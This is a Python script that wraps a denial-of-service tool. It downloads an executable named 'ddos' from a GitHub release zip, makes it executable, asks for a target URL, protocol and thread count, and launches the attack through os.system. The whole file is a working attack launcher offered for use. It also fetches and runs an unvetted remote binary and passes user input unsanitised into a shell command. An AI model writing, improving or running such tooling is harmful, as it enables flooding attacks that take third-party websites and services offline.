#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import os
import zipfile
import sys
import stat

TOOL_NAME = "ddos"
TOOL_URL = "https://github.com/Gisnsl/Users/releases/download/1.0/ddos.zip"
ZIP_NAME = "ddos.zip"
HOME_PATH = os.path.expanduser("~")
TOOL_PATH = os.path.join(HOME_PATH, TOOL_NAME)

def install_tool():
    print("[*] Downloading ddos tool...")
    try:
        r = requests.get(TOOL_URL, stream=True, timeout=60)
        r.raise_for_status()
        with open(ZIP_NAME, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        print("[+] Download complete. Extracting...")
        with zipfile.ZipFile(ZIP_NAME, "r") as z:
            z.extractall(HOME_PATH)
        os.remove(ZIP_NAME)

        for root, dirs, files in os.walk(HOME_PATH):
            if TOOL_NAME in files:
                tool_found = os.path.join(root, TOOL_NAME)
                os.chmod(tool_found, os.stat(tool_found).st_mode | stat.S_IEXEC)
                print("[+] Installed successfully at:", tool_found)
                return tool_found
        print("[!] Tool not found in extracted files.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error during install: {e}")
        sys.exit(1)

def check_tool():
    for root, dirs, files in os.walk(HOME_PATH):
        if TOOL_NAME in files:
            tool_path = os.path.join(root, TOOL_NAME)
            if not os.access(tool_path, os.X_OK):
                os.chmod(tool_path, os.stat(tool_path).st_mode | stat.S_IEXEC)
            return tool_path
    return None

def get_input(prompt, default=None):
    if default is not None:
        value = input(f"{prompt} [{default}]: ").strip()
        return value if value else default
    while True:
        value = input(f"{prompt}: ").strip()
        if value:
            return value
        print("[!] Value cannot be empty.")

def main():
    print("=" * 50)
    print("       DDoS Tool Wrapper - By AhmedAlhrrani")
    print("=" * 50)

    tool_path = check_tool()
    if not tool_path:
        print("[!] Tool not found. Installing...")
        tool_path = install_tool()

    url = get_input("[?] Enter target URL")
    if not url.startswith(("http://", "https://")):
        print("[!] URL must start with http:// or https://")
        sys.exit(1)

    print("\n[?] Select protocol:")
    print("    1) HTTP/1.1 (h1)")
    print("    2) HTTP/2 (h2)")
    print("    3) Auto (auto)")
    choice = get_input("[?] Enter choice", "1")
    protocol_map = {"1": "h1", "2": "h2", "3": "auto"}
    protocol = protocol_map.get(choice, "h1")

    threads = get_input("[?] Enter number of threads", "100")

    try:
        int_threads = int(threads)
        if int_threads < 1:
            print("[!] Threads must be >= 1")
            sys.exit(1)
    except ValueError:
        print("[!] Invalid thread count")
        sys.exit(1)

    cmd = f"{tool_path} -u {url} -t {threads} -p {protocol}"
    print("\n[+] Starting attack:")
    print(f"    Target   : {url}")
    print(f"    Threads  : {threads}")
    print(f"    Protocol : {protocol}")
    print("[+] Press Ctrl+C to stop.\n")

    os.system(cmd)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)
